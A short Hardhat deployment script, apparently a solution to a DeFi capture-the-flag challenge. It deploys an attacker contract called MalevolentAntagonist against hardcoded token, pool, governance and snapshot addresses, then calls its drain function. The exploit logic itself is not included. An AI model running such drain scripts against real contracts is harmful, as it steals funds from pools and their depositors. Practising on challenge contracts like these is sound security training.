// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import { MalevolentAntagonist__factory } from "../typechain";

const KEVS_ADDRESS = "0x77fb4fa1ABA92576942aD34BC47834059b84e693";
const POOL_ADDRESS = "0x17DacaDfe637615A1796abA4b4ea7024888Bc89c";
const GOV_ADDRESS = "0x521eACB3fa5068EEB9812cB9FC87F0cCFf9951d8";
const DVT_SNAP_ADDRESS = "0x764bAF2f7Cab6092a2e2418a3280aEE62c1Ff40f";

async function main() {
  const signers = await ethers.getSigners();
  const deployer = signers[0];

  // We get the contract to deploy
  const attacker = await new MalevolentAntagonist__factory(deployer).deploy(
    KEVS_ADDRESS,
    POOL_ADDRESS,
    GOV_ADDRESS,
    DVT_SNAP_ADDRESS
  );
  await attacker.deployed();

  console.log("MalevolentAntagonist deployed to:", attacker.address);

  // Drain
  await attacker.drain(DVT_SNAP_ADDRESS);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
